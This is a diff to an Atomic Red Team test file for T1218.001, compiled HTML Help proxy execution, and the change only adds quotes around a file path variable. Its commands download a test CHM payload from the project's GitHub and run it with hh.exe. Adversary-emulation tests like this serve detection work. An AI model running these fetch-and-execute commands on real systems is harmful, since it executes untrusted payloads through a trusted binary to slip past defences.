@@ -18,13 +18,13 @@ atomic_tests:
   - description: |
       The payload must exist on disk at specified location (#{local_chm_file})
     prereq_command: |
-      if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{local_chm_file}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{local_chm_file}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
   executor:
     command: |
-      hh.exe #{local_chm_file}
+      hh.exe "#{local_chm_file}"
     name: command_prompt
 - name: Compiled HTML Help Remote Payload
   auto_generated_guid: 0f8af516-9818-4172-922b-42986ef1e81d
@@ -205,13 +205,13 @@ atomic_tests:
   - description: |
       The payload must exist on disk at specified location (#{local_chm_file})
     prereq_command: |
-      if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{local_chm_file}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{local_chm_file}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
   executor:
     command: |
-      hh.exe -decompile %temp% #{local_chm_file}
+      hh.exe -decompile %temp% "#{local_chm_file}"
     cleanup_command: |
       del %temp%\T1218.001.html >nul 2>&1
     name: command_prompt
